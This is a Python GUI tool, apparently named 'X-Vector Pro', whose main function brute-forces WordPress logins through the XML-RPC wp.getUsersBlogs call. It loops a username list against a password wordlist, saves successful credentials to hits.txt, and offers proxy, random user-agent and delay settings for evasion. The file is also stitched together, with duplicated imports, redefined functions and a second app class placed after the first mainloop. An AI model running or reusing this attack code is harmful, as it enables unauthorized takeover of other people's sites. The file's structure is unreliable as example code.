import customtkinter as ctk
from gui.brute_tab import BruteTab
from gui.auto_tab import AutoModeTab
from gui.exploit_tab import ExploitsTab
from gui.reports_tab import ReportsTab
from gui.logs_tab import LogsTab
from utils.splash import show_splash_screen
from utils.settings import load_settings
import os
import json
import xmlrpc.client
import customtkinter as ctk
from tkinter import messagebox
from datetime import datetime

# === SPLASH SCREEN ===
def show_splash_screen():
    splash = ctk.CTk()
    splash.geometry("400x200")
    splash.title("X-Vector Pro")
    ctk.CTkLabel(splash, text="Initializing X-Vector Pro...", font=("Arial", 18)).pack(pady=40)
    ctk.CTkLabel(splash, text="Silent. Adaptive. Lethal.", font=("Courier", 12)).pack()
    splash.after(2000, splash.destroy)
    splash.mainloop()

# === SETTINGS ===
def load_settings():
    try:
        with open("config.json", "r") as f:
            return json.load(f)
    except:
        return {
            "use_proxy": False,
            "delay_seconds": 0.5,
            "random_user_agent": True,
            "default_wordlist": ""
        }

def save_settings():
    config = {
        "use_proxy": proxy_toggle.get(),
        "delay_seconds": delay_slider.get(),
        "random_user_agent": ua_toggle.get(),
        "default_wordlist": wordlist_path_entry.get().strip()
    }
    with open("config.json", "w") as f:
        json.dump(config, f, indent=2)
    log_to_central("[+] Settings saved to config.json")

# === LOGGER ===
def log_to_central(msg):
    timestamp = datetime.now().strftime("%H:%M:%S")
    logs_output.insert("end", f"[{timestamp}] {msg}\n")
    logs_output.see("end")

# === BRUTE FORCE FUNCTION ===
def run_brute_force():
    target = target_entry.get().strip()
    usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines()]
    wordlist_path = wordlist_entry.get().strip()

    if not target or not usernames or not wordlist_path:
        messagebox.showerror("Error", "Please fill all fields.")
        return

    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        messagebox.showerror("File Error", f"Cannot read password list:\n{e}")
        return

    log_box.insert("end", "[*] Starting brute force...\n")
    try:
        server = xmlrpc.client.ServerProxy(target)
    except Exception as e:
        log_box.insert("end", f"[-] Failed to connect: {e}\n")
        return

    for user in usernames:
        log_box.insert("end", f"\n[*] Trying user: {user}\n")
        for password in passwords:
            try:
                resp = server.wp.getUsersBlogs(user, password)
                if resp:
                    hit = f"[+] HIT: {user}:{password}\n"
                    log_box.insert("end", hit)
                    with open("hits.txt", "a") as hit_file:
                        hit_file.write(f"{user}:{password}\n")
                    break
            except xmlrpc.client.Fault:
                continue
            except Exception as e:
                log_box.insert("end", f"[-] Error with {user}: {e}\n")
                break
    log_box.insert("end", "[*] Brute force finished.\n")

# === MAIN APP UI ===
show_splash_screen()

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

app = ctk.CTk()
app.geometry("900x650")
app.title("X-Vector Pro | Silent. Adaptive. Lethal.")

tabs = ctk.CTkTabview(app, width=880, height=620)
tabs.pack(padx=10, pady=10)

# Tabs
brute_tab = tabs.add("Brute Force")
logs_tab = tabs.add("Logs")
settings_tab = tabs.add("Settings")

# === BRUTE TAB WIDGETS ===
ctk.CTkLabel(brute_tab, text="Target XML-RPC URL:").pack()
target_entry = ctk.CTkEntry(brute_tab, width=400)
target_entry.pack(pady=5)

ctk.CTkLabel(brute_tab, text="Usernames (one per line):").pack()
usernames_box = ctk.CTkTextbox(brute_tab, width=400, height=100)
usernames_box.pack(pady=5)

ctk.CTkLabel(brute_tab, text="Wordlist Path:").pack()
wordlist_entry = ctk.CTkEntry(brute_tab, width=400)
wordlist_entry.pack(pady=5)

ctk.CTkButton(brute_tab, text="Run Brute Force", command=run_brute_force).pack(pady=10)

log_box = ctk.CTkTextbox(brute_tab, width=800, height=200)
log_box.pack(pady=5)

# === LOGS TAB WIDGETS ===
logs_output = ctk.CTkTextbox(logs_tab, width=850, height=550)
logs_output.pack(pady=10)

# === SETTINGS TAB WIDGETS ===
settings = load_settings()

proxy_toggle = ctk.CTkCheckBox(settings_tab, text="Use Proxy")
proxy_toggle.pack(pady=5)
proxy_toggle.select() if settings["use_proxy"] else proxy_toggle.deselect()

ua_toggle = ctk.CTkCheckBox(settings_tab, text="Random User Agent")
ua_toggle.pack(pady=5)
ua_toggle.select() if settings["random_user_agent"] else ua_toggle.deselect()

delay_slider = ctk.CTkSlider(settings_tab, from_=0.1, to=5.0, number_of_steps=49)
delay_slider.set(settings["delay_seconds"])
delay_slider.pack(pady=5)

ctk.CTkLabel(settings_tab, text="Default Wordlist Path:").pack()
wordlist_path_entry = ctk.CTkEntry(settings_tab, width=400)
wordlist_path_entry.insert(0, settings["default_wordlist"])
wordlist_path_entry.pack(pady=5)

ctk.CTkButton(settings_tab, text="Save Settings", command=save_settings).pack(pady=10)

# === LAUNCH ===
app.mainloop()

class DashboardFrame(ctk.CTkFrame):
    def __init__(self, parent):
        super().__init__(parent)
        self.pack(fill="both", expand=True)

        # Sidebar
        self.sidebar = ctk.CTkFrame(self, width=200, fg_color="#1C1C1C")
        self.sidebar.pack(side="left", fill="y")

        # Tab content area
        self.content_frame = ctk.CTkFrame(self)
        self.content_frame.pack(side="right", fill="both", expand=True)

        # Tab view
        self.tab_view = ctk.CTkTabview(self.content_frame)
        self.tab_view.pack(fill="both", expand=True, padx=10, pady=10)

        # Tabs
        self.brute_tab = BruteTab(self.tab_view)
        self.auto_tab = AutoModeTab(self.tab_view)
        self.exploit_tab = ExploitsTab(self.tab_view)
        self.reports_tab = ReportsTab(self.tab_view)
        self.logs_tab = LogsTab(self.tab_view)

        self.tab_view.add("Brute Force")
        self.tab_view.tab("Brute Force").configure(content=self.brute_tab)

        self.tab_view.add("Auto Mode")
        self.tab_view.tab("Auto Mode").configure(content=self.auto_tab)

        self.tab_view.add("Exploits")
        self.tab_view.tab("Exploits").configure(content=self.exploit_tab)

        self.tab_view.add("Reports")
        self.tab_view.tab("Reports").configure(content=self.reports_tab)

        self.tab_view.add("Logs")
        self.tab_view.tab("Logs").configure(content=self.logs_tab)

        # Sidebar buttons
        self._add_sidebar_button("Brute Force", "#FF4500", "#FF6347")
        self._add_sidebar_button("Auto Mode", "#007bff", "#0056b3")
        self._add_sidebar_button("Exploits", "#FF4500", "#FF6347")
        self._add_sidebar_button("Reports", "#007bff", "#0056b3")
        self._add_sidebar_button("Logs", "#FF4500", "#FF6347")

    def _add_sidebar_button(self, name, fg_color, hover_color):
        button = ctk.CTkButton(
            self.sidebar,
            text=name,
            command=lambda n=name: self.tab_view.set(n),
            fg_color=fg_color,
            hover_color=hover_color,
            width=180
        )
        button.pack(pady=10, padx=10)

class MainApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("X-Vector Pro | Silent. Adaptive. Lethal.")
        self.geometry("1200x800")

        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")

        show_splash_screen()
        load_settings()

        DashboardFrame(self)

if __name__ == "__main__":
    MainApp().mainloop()
